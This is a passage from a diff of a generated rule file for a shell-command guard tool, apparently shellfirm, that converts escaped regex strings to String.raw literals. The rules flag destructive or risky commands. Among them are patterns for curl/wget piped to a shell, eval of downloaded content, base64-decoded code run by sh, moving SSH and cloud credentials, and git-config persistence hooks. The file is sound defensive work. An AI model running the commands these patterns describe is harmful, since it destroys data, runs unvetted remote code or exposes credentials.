+				String.raw`(?:(?:^|\s)\d*(?:>>?|>\||&>>?)\s+|(?:^|\s)tee\s+(?:\S+\s+)*?)(\/etc\/\S+|\/boot\/\S+|\/usr\/\S+|\/s?bin\/\S+|\/lib(?:64)?\/\S+|\/System\/\S+)(?:\s|$)|(?:(?:^|\s)\d*(?:>|>\||&>)\s+|(?:^|\s)tee\s+(?:(?:-[b-zA-Z]\S*|--[b-z]\S*|[^-\s]\S*)\s+)*?)((?:~|\$HOME)\/\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|zlogin|cshrc|tcshrc|config\/fish\/config\.fish))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -582,7 +582,7 @@ export const GENERATED = {
 			description:
 				"This adds an alias to a shell startup file that makes a command run a different, destructive one (for example `ls` running `rm`) in every new shell.",
 			feed: "parsed",
-			regex: "^shellfirm-startup-alias\\s",
+			regex: String.raw`^shellfirm-startup-alias\s`,
 			flags: "",
 			filters: [],
 		},
@@ -593,7 +593,7 @@ export const GENERATED = {
 				"This deletes a system file. The system may not boot or let you log in afterwards.",
 			feed: "parsed",
 			regex:
-				"^(?:rm|unlink)\\s+(?:\\S+\\s+)*?(\\/etc\\/\\S+|\\/boot\\/\\S+|\\/(?:usr\\/)?s?bin\\/\\S+|\\/usr\\/lib\\S*\\/\\S+|\\/lib(?:64)?\\/\\S+)(?:\\s|$)",
+				String.raw`^(?:rm|unlink)\s+(?:\S+\s+)*?(\/etc\/\S+|\/boot\/\S+|\/(?:usr\/)?s?bin\/\S+|\/usr\/lib\S*\/\S+|\/lib(?:64)?\/\S+)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -604,7 +604,7 @@ export const GENERATED = {
 				"This moves a system file or directory (or your home directory) away. Programs and logins that need it break until it is moved back.",
 			feed: "parsed",
 			regex:
-				"^mv\\s+(?:\\S+\\s+)*?(\\/etc(?:\\/\\S*)?|\\/boot(?:\\/\\S*)?|\\/(?:usr\\/)?s?bin(?:\\/\\S*)?|\\/usr|\\/usr\\/lib\\S*|\\/lib(?:64)?(?:\\/\\S*)?|~|\\$HOME|\\/home\\/[^/\\s]+|\\/Users\\/[^/\\s]+|\\/root)\\s+(?:\\S+\\s+)*?\\S+\\s*$",
+				String.raw`^mv\s+(?:\S+\s+)*?(\/etc(?:\/\S*)?|\/boot(?:\/\S*)?|\/(?:usr\/)?s?bin(?:\/\S*)?|\/usr|\/usr\/lib\S*|\/lib(?:64)?(?:\/\S*)?|~|\$HOME|\/home\/[^/\s]+|\/Users\/[^/\s]+|\/root)\s+(?:\S+\s+)*?\S+\s*$`,
 			flags: "",
 			filters: [],
 		},
@@ -615,7 +615,7 @@ export const GENERATED = {
 				"This moves SSH keys, GPG keys or cloud / cluster credentials out of your home directory (or into an archive that deletes them): logins and CLIs that use them stop working, and the copy may be readable elsewhere.",
 			feed: "parsed",
 			regex:
-				"^(?:mv\\s+(?:\\S+\\s+)*?((?:~|\\$HOME|\\/home\\/[^/\\s]+|\\/Users\\/[^/\\s]+|\\/root)\\/\\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\\/gcloud)(?:\\/\\S*)?)\\s+(?:\\S+\\s+)*?\\S+\\s*$|zip\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*m[a-zA-Z]*|--move)\\s+(?:\\S+\\s+)*?((?:~|\\$HOME|\\/home\\/[^/\\s]+|\\/Users\\/[^/\\s]+|\\/root)\\/\\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\\/gcloud)(?:\\/\\S*)?)(?:\\s|$))",
+				String.raw`^(?:mv\s+(?:\S+\s+)*?((?:~|\$HOME|\/home\/[^/\s]+|\/Users\/[^/\s]+|\/root)\/\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\/gcloud)(?:\/\S*)?)\s+(?:\S+\s+)*?\S+\s*$|zip\s+(?:\S+\s+)*?(?:-[a-zA-Z]*m[a-zA-Z]*|--move)\s+(?:\S+\s+)*?((?:~|\$HOME|\/home\/[^/\s]+|\/Users\/[^/\s]+|\/root)\/\.(?:ssh|gnupg|aws|kube|azure|docker|password-store|config\/gcloud)(?:\/\S*)?)(?:\s|$))`,
 			flags: "",
 			filters: [],
 		},
@@ -626,7 +626,7 @@ export const GENERATED = {
 				"This replaces the file with /dev/null and erases its contents.",
 			feed: "parsed",
 			regex:
-				"^(?:cp(?:\\s+-\\S+)*|ln(?:\\s+-\\S+)*\\s+-[a-zA-Z]*f[a-zA-Z]*(?:\\s+-\\S+)*)\\s+\\/dev\\/(?:null|zero)\\s+(\\S+)(?:\\s|$)",
+				String.raw`^(?:cp(?:\s+-\S+)*|ln(?:\s+-\S+)*\s+-[a-zA-Z]*f[a-zA-Z]*(?:\s+-\S+)*)\s+\/dev\/(?:null|zero)\s+(\S+)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -637,12 +637,12 @@ export const GENERATED = {
 				"Changing permissions of the root, home or a system directory can lock you out and break SSH and system services.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)chmod\\s+(?:-\\S+\\s+)*\\S+\\s+(\\/|~|\\$HOME|\\/(?:etc|usr|bin|sbin|boot|home|root|var|lib|lib64|System|Users|Library))(?:\\s|$)",
+				String.raw`(?:^|\s)chmod\s+(?:-\S+\s+)*\S+\s+(\/|~|\$HOME|\/(?:etc|usr|bin|sbin|boot|home|root|var|lib|lib64|System|Users|Library))(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
-					value: "\\s(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)(?:\\s|$)",
+					value: String.raw`\s(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)(?:\s|$)`,
 				},
 			],
 		},
@@ -653,7 +653,7 @@ export const GENERATED = {
 				"This erases the filesystem / partition-table signatures of a device, making its data unreachable.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)wipefs\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*a[a-zA-Z]*|--all|-o|--offset)(?:\\s|$|=)",
+				String.raw`(?:^|\s)wipefs\s+(?:\S+\s+)*?(?:-[a-zA-Z]*a[a-zA-Z]*|--all|-o|--offset)(?:\s|$|=)`,
 			flags: "",
 			filters: [],
 		},
@@ -664,7 +664,7 @@ export const GENERATED = {
 				"This destroys a ZFS dataset / pool and all of its data and snapshots.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:zfs\\s+(?:\\S+\\s+)*?destroy|zpool\\s+(?:\\S+\\s+)*?destroy)\\s",
+				String.raw`(?:^|\s)(?:zfs\s+(?:\S+\s+)*?destroy|zpool\s+(?:\S+\s+)*?destroy)\s`,
 			flags: "",
 			filters: [
 				{
@@ -681,7 +681,7 @@ export const GENERATED = {
 				"This recursively changes the owner or permissions of a system data / service directory: the service that owns it can stop working.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:chown|chgrp|chmod)\\s+(?:\\S+\\s+)*?(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\\s+(?:\\S+\\s+)*?(\\/(?:var\\/lib|var\\/www|var\\/log|srv|opt|etc|usr)\\/[^\\s]+)(?:\\s|$)",
+				String.raw`(?:^|\s)(?:chown|chgrp|chmod)\s+(?:\S+\s+)*?(?:-[a-zA-Z]*R[a-zA-Z]*|--recursive)\s+(?:\S+\s+)*?(\/(?:var\/lib|var\/www|var\/log|srv|opt|etc|usr)\/[^\s]+)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -692,7 +692,7 @@ export const GENERATED = {
 				"This rolls the ZFS dataset back and destroys every later snapshot (and with -R their clones).",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)zfs\\s+(?:\\S+\\s+)*?rollback\\s+(?:\\S+\\s+)*?-[a-zA-Z]*[rR][a-zA-Z]*\\s",
+				String.raw`(?:^|\s)zfs\s+(?:\S+\s+)*?rollback\s+(?:\S+\s+)*?-[a-zA-Z]*[rR][a-zA-Z]*\s`,
 			flags: "",
 			filters: [],
 		},
@@ -702,7 +702,7 @@ export const GENERATED = {
 			description:
 				"This discards all uncommitted changes in your working tree.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s+reset\\b.*\\s--hard(?:\\s|$)",
+			regex: String.raw`(?:^|\s)git\s+reset\b.*\s--hard(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -711,12 +711,12 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This deletes all tracked files from the working tree.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s+rm\\s+(?:-\\S+\\s+)*(\\*|\\.)(\\s|$)",
+			regex: String.raw`(?:^|\s)git\s+rm\s+(?:-\S+\s+)*(\*|\.)(\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
-					value: "\\s--cached(?:\\s|$)",
+					value: String.raw`\s--cached(?:\s|$)`,
 				},
 			],
 		},
@@ -727,13 +727,13 @@ export const GENERATED = {
 				"This permanently deletes untracked files (and directories with -d). Git cannot restore them.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+clean\\b.*\\s(?:-[a-zA-Z]*f[a-zA-Z]*|--force)(?:\\s|$)",
+				String.raw`(?:^|\s)git\s+clean\b.*\s(?:-[a-zA-Z]*f[a-zA-Z]*|--force)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:[^-\\s]\\S*|-[^\\s=]*=\\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`(?:^|\s)(?:[^-\s]\S*|-[^\s=]*=\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -743,13 +743,13 @@ export const GENERATED = {
 			description: "This force-pushes and can overwrite remote history.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+push\\b.*\\s(?:-[a-zA-Z]*f[a-zA-Z]*|--force|\\+\\S+)(?:\\s|$)",
+				String.raw`(?:^|\s)git\s+push\b.*\s(?:-[a-zA-Z]*f[a-zA-Z]*|--force|\+\S+)(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:[^-\\s]\\S*|-[^\\s=]*=\\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`(?:^|\s)(?:[^-\s]\S*|-[^\s=]*=\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -759,7 +759,7 @@ export const GENERATED = {
 			description: "This deletes a branch even if it has unmerged commits.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s{1,}branch\\s{1,}(?:-D|(?:-d|--delete)\\s+--force|--force\\s+(?:-d|--delete))",
+				String.raw`(?:^|\s)git\s{1,}branch\s{1,}(?:-D|(?:-d|--delete)\s+--force|--force\s+(?:-d|--delete))`,
 			flags: "",
 			filters: [],
 		},
@@ -768,7 +768,7 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This force-checks-out and discards local changes.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}checkout\\s{1,}.*(-f\\b|--force)",
+			regex: String.raw`(?:^|\s)git\s{1,}checkout\s{1,}.*(-f\b|--force)`,
 			flags: "",
 			filters: [],
 		},
@@ -778,7 +778,7 @@ export const GENERATED = {
 			description: "This discards all uncommitted changes in the working tree.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+checkout\\s+(?:\\S+\\s+)*?(?:--\\s+)?(\\.\\/?|\\*|:\\/)(\\s|$)",
+				String.raw`(?:^|\s)git\s+checkout\s+(?:\S+\s+)*?(?:--\s+)?(\.\/?|\*|:\/)(\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -788,7 +788,7 @@ export const GENERATED = {
 			description: "This discards all uncommitted changes in the working tree.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+restore(?:\\s+(?:[^-\\s]\\S*|-[^-\\sS]+|--(?:(?:[^s\\s]|s[^t\\s])\\S*)?))*?\\s+(\\.\\/?|\\*)(?:\\s|$)|(?:^|\\s)git\\s+restore\\s+(?:\\S+\\s+)*?(?:--worktree|-[a-zA-Z]*W[a-zA-Z]*)\\s+(?:\\S+\\s+)*?(\\.\\/?|\\*)(?:\\s|$)",
+				String.raw`(?:^|\s)git\s+restore(?:\s+(?:[^-\s]\S*|-[^-\sS]+|--(?:(?:[^s\s]|s[^t\s])\S*)?))*?\s+(\.\/?|\*)(?:\s|$)|(?:^|\s)git\s+restore\s+(?:\S+\s+)*?(?:--worktree|-[a-zA-Z]*W[a-zA-Z]*)\s+(?:\S+\s+)*?(\.\/?|\*)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -797,7 +797,7 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This rewrites Git history.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}filter-branch",
+			regex: String.raw`(?:^|\s)git\s{1,}filter-branch`,
 			flags: "",
 			filters: [],
 		},
@@ -806,7 +806,7 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This permanently deletes unreachable objects.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}gc\\s{1,}.*--prune=now",
+			regex: String.raw`(?:^|\s)git\s{1,}gc\s{1,}.*--prune=now`,
 			flags: "",
 			filters: [],
 		},
@@ -815,7 +815,7 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This deletes a Git reference.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}update-ref\\s{1,}(-d\\b|--delete)",
+			regex: String.raw`(?:^|\s)git\s{1,}update-ref\s{1,}(-d\b|--delete)`,
 			flags: "",
 			filters: [],
 		},
@@ -824,7 +824,7 @@ export const GENERATED = {
 			decision: "ask",
 			description: "This permanently deletes all stash entries.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}stash\\s{1,}clear(\\s|$)",
+			regex: String.raw`(?:^|\s)git\s{1,}stash\s{1,}clear(\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -834,13 +834,13 @@ export const GENERATED = {
 			description:
 				"Mirror push overwrites the ENTIRE remote — all branches, tags, and refs.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}push\\s{1,}.*--mirror",
+			regex: String.raw`(?:^|\s)git\s{1,}push\s{1,}.*--mirror`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:[^-\\s]\\S*|-[^\\s=]*=\\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`(?:^|\s)(?:[^-\s]\S*|-[^\s=]*=\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -850,13 +850,13 @@ export const GENERATED = {
 			description: "This deletes a remote branch or tag.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s{1,}push\\s{1,}(\\S+\\s{1,}--delete\\s|--delete\\s{1,}\\S+\\s|\\S+\\s{1,}:\\S)",
+				String.raw`(?:^|\s)git\s{1,}push\s{1,}(\S+\s{1,}--delete\s|--delete\s{1,}\S+\s|\S+\s{1,}:\S)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:[^-\\s]\\S*|-[^\\s=]*=\\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`(?:^|\s)(?:[^-\s]\S*|-[^\s=]*=\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -866,13 +866,13 @@ export const GENERATED = {
 			description:
 				"This deletes every branch on the remote that does not exist locally (with --all in a fresh clone: every other branch).",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s+push\\b(?:\\s+\\S+)*?\\s--prune(?:\\s|$)",
+			regex: String.raw`(?:^|\s)git\s+push\b(?:\s+\S+)*?\s--prune(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:[^-\\s]\\S*|-[^\\s=]*=\\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\\s+(?:[^\\-\\s]\\S*|-(?:[^\\-d\\s]\\S*|-(?:[^dn\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?|n(?:[^o\\s]\\S*|o(?:[^\\-\\s]\\S*|-(?:[^d\\s]\\S*|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*))?)?)?)?)?|d(?:[^r\\s]\\S*|r(?:[^y\\s]\\S*)?)?)?))*\\s*$",
+						String.raw`(?:^|\s)(?:[^-\s]\S*|-[^\s=]*=\S*|-[dfinqxXuv46]+|--force|--force-with-lease|--force-if-includes|--all|--mirror|--tags|--prune|--delete|--set-upstream|--verbose|--quiet|--porcelain|--atomic|--no-verify|--follow-tags|--progress|--no-progress|--no-dry-run)\s+(?:-[a-zA-Z]*n[a-zA-Z]*|--dry-run)(?:\s+(?:[^\-\s]\S*|-(?:[^\-d\s]\S*|-(?:[^dn\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?|n(?:[^o\s]\S*|o(?:[^\-\s]\S*|-(?:[^d\s]\S*|d(?:[^r\s]\S*|r(?:[^y\s]\S*))?)?)?)?)?|d(?:[^r\s]\S*|r(?:[^y\s]\S*)?)?)?))*\s*$`,
 				},
 			],
 		},
@@ -882,7 +882,7 @@ export const GENERATED = {
 			description:
 				"Expiring all reflog entries destroys the last recovery mechanism for lost commits.",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s{1,}reflog\\s{1,}expire\\s{1,}.*--expire=now",
+			regex: String.raw`(?:^|\s)git\s{1,}reflog\s{1,}expire\s{1,}.*--expire=now`,
 			flags: "",
 			filters: [],
 		},
@@ -892,7 +892,7 @@ export const GENERATED = {
 			description: "This switches branches and discards local changes.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+switch\\s+(?:\\S+\\s+)*?(?:--discard-changes|-f|--force)(?:\\s|$)",
+				String.raw`(?:^|\s)git\s+switch\s+(?:\S+\s+)*?(?:--discard-changes|-f|--force)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -903,7 +903,7 @@ export const GENERATED = {
 				"This makes git run a program from the given location on every git command (hooks / ssh / fsmonitor / the ext:: transport), a common persistence trick.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)git\\s+(?:--shellfirm-one-shot\\s+)?config\\s+(?:\\S+\\s+)*?(?:core\\.hooksPath|core\\.sshCommand|core\\.fsmonitor|uploadpack\\.packObjectsHook|protocol\\.ext\\.allow|url\\.[\"']?ext::\\S*\\.insteadOf)\\s+\\S",
+				String.raw`(?:^|\s)git\s+(?:--shellfirm-one-shot\s+)?config\s+(?:\S+\s+)*?(?:core\.hooksPath|core\.sshCommand|core\.fsmonitor|uploadpack\.packObjectsHook|protocol\.ext\.allow|url\.["']?ext::\S*\.insteadOf)\s+\S`,
 			flags: "",
 			filters: [
 				{
@@ -919,7 +919,7 @@ export const GENERATED = {
 			description:
 				"This rewrites the whole repository history (and removes the origin remote).",
 			feed: "parsed",
-			regex: "(?:^|\\s)git\\s+filter-repo\\b",
+			regex: String.raw`(?:^|\s)git\s+filter-repo\b`,
 			flags: "",
 			filters: [],
 		},
@@ -929,7 +929,7 @@ export const GENERATED = {
 			description:
 				"This force-pushes (with lease) to a protected branch and rewrites its shared history.",
 			feed: "parsed",
-			regex: "^shellfirm-force-push-protected\\s",
+			regex: String.raw`^shellfirm-force-push-protected\s`,
 			flags: "",
 			filters: [],
 		},
@@ -939,7 +939,7 @@ export const GENERATED = {
 			description:
 				"This force-pushes (with lease) to a branch that is only known when the line runs; this repository has a protected branch, so it may rewrite that branch's shared history.",
 			feed: "parsed",
-			regex: "^shellfirm-force-push-unknown-target(?:\\s|$)",
+			regex: String.raw`^shellfirm-force-push-unknown-target(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -950,7 +950,7 @@ export const GENERATED = {
 				"Piping remote content directly to shell executes arbitrary code without inspection.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)curl\\s+.*\\|\\s*(?:sudo\\s+)?(bash|sh|zsh|fish|source\\s)",
+				String.raw`(?:^|\s)curl\s+.*\|\s*(?:sudo\s+)?(bash|sh|zsh|fish|source\s)`,
 			flags: "",
 			filters: [],
 		},
@@ -961,7 +961,7 @@ export const GENERATED = {
 				"Piping downloaded content to shell executes arbitrary code without inspection.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)wget\\s+.*-\\S*O\\s*-\\s.*\\|\\s*(?:sudo\\s+)?(bash|sh|zsh|fish)",
+				String.raw`(?:^|\s)wget\s+.*-\S*O\s*-\s.*\|\s*(?:sudo\s+)?(bash|sh|zsh|fish)`,
 			flags: "",
 			filters: [],
 		},
@@ -971,7 +971,7 @@ export const GENERATED = {
 			description:
 				"Evaluating remote content executes arbitrary code without inspection.",
 			feed: "raw",
-			regex: '(?:^|\\s)eval\\s+"?\\$\\(curl',
+			regex: String.raw`(?:^|\s)eval\s+"?\$\(curl`,
 			flags: "",
 			filters: [],
 		},
@@ -982,7 +982,7 @@ export const GENERATED = {
 				"Piping remote content to an interpreter executes arbitrary code without inspection.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:curl|wget)\\s+.*\\|\\s*(?:sudo\\s+)?(python[\\d.]*|perl|ruby|node|nodejs|bun|deno|php|lua)\\b",
+				String.raw`(?:^|\s)(?:curl|wget)\s+.*\|\s*(?:sudo\s+)?(python[\d.]*|perl|ruby|node|nodejs|bun|deno|php|lua)\b`,
 			flags: "",
 			filters: [
 				{
@@ -999,7 +999,7 @@ export const GENERATED = {
 				"This decodes hidden text and runs it as shell commands, so you cannot see what it does.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:(?:base64|base32)\\s+(?:\\S+\\s+)*?(?:-d|--decode|-D)|xxd\\s+(?:\\S+\\s+)*?-r|rev|(?:gzip|bzip2|xz|zstd)\\s+(?:\\S+\\s+)*?-d|gunzip|zcat|openssl\\s+(?:enc|base64)\\s+(?:\\S+\\s+)*?-d)(?:\\s.*)?\\|\\s*(?:sudo\\s+(?:-\\S+\\s+)*)?(?:ba|z|da|k|fi)?sh(?:\\s|$)",
+				String.raw`(?:^|\s)(?:(?:base64|base32)\s+(?:\S+\s+)*?(?:-d|--decode|-D)|xxd\s+(?:\S+\s+)*?-r|rev|(?:gzip|bzip2|xz|zstd)\s+(?:\S+\s+)*?-d|gunzip|zcat|openssl\s+(?:enc|base64)\s+(?:\S+\s+)*?-d)(?:\s.*)?\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z|da|k|fi)?sh(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -1009,7 +1009,7 @@ export const GENERATED = {
 			description:
 				"This runs (eval) text that is decoded or transformed first, so you cannot see the commands it runs.",
 			feed: "raw",
-			regex: "^shellfirm-transformed-code\\s",
+			regex: String.raw`^shellfirm-transformed-code\s`,
 			flags: "",
 			filters: [],
 		},
@@ -1020,7 +1020,7 @@ export const GENERATED = {
 				"This runs a downloaded script directly (process substitution) without inspection.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:(?:ba|z|da|k)?sh|source|\\.|python[\\d.]*|perl|ruby|node|php)\\s+(?:-\\S+\\s+)*<\\s*\\(\\s*(?:curl|wget)\\b",
+				String.raw`(?:^|\s)(?:(?:ba|z|da|k)?sh|source|\.|python[\d.]*|perl|ruby|node|php)\s+(?:-\S+\s+)*<\s*\(\s*(?:curl|wget)\b`,
 			flags: "",
 			filters: [],
 		},
@@ -1030,7 +1030,7 @@ export const GENERATED = {
 			description:
 				"The command is nested too deeply (eval / $( ) / bash -c inside each other) or is too large or malformed to be analyzed safely.",
 			feed: "raw",
-			regex: "^shellfirm-nesting-limit\\s",
+			regex: String.raw`^shellfirm-nesting-limit\s`,
 			flags: "",
 			filters: [],
 		},
@@ -1051,7 +1051,7 @@ export const GENERATED = {
 			description:
